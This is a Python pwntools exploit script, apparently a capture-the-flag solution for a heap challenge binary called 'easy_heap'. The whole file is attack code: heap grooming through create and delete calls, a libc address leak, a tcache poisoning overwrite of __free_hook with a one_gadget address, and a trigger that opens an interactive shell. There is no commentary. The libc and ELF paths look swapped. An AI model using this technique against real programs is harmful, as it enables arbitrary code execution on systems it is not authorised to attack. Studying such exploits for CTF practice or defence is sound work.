from pwn import *

p = process('./easy_heap')
libc = ELF('easy_heap')
elf = ELF('./libc64.so')
context.log_level = 'debug'

def create(size,content) :
    p.sendlineafter('> ','1')
    p.sendlineafter('> ',str(size))
    p.sendlineafter('> ',content)

def show(index) :
    p.sendlineafter('> ','3')
    p.sendlineafter('> ',str(index))

def delete(index) :
    p.sendlineafter('> ','2')
    p.sendlineafter('> ',str(index))

for i in range(10):
    create(0xf8,'A'*0xf0)
delete(1)
delete(3)
for i in range(5,10):
    delete(i)
delete(0)
delete(2)
delete(4)

for i in range(7) :
    create(0xf0,'\n')
create(0xf0,'\n')
create(0xf8,'\n')

for i in range(5) :
    delete(i)
delete(6)
delete(5)

show(8)
for i in range(9) :
    p.recvuntil('> ')
data = u64(p.recv(6).ljust(8,'\x00'))

libc_base = data - 4111520
log.success('libc base is :'+hex(libc_base))
free_hook = libc_base + 4118760
one_gadget = libc_base + 0x4f322
log.success('free hook is :'+hex(free_hook))

for i in range(7) :
    create(0xf0,'\n')
create(0xf0,'\n')
delete(0)
delete(8)
delete(9)
create(0xf0,p64(free_hook))
create(0xf0,p64(free_hook))
create(0xf0,p64(one_gadget))

delete(1)

p.interactive()
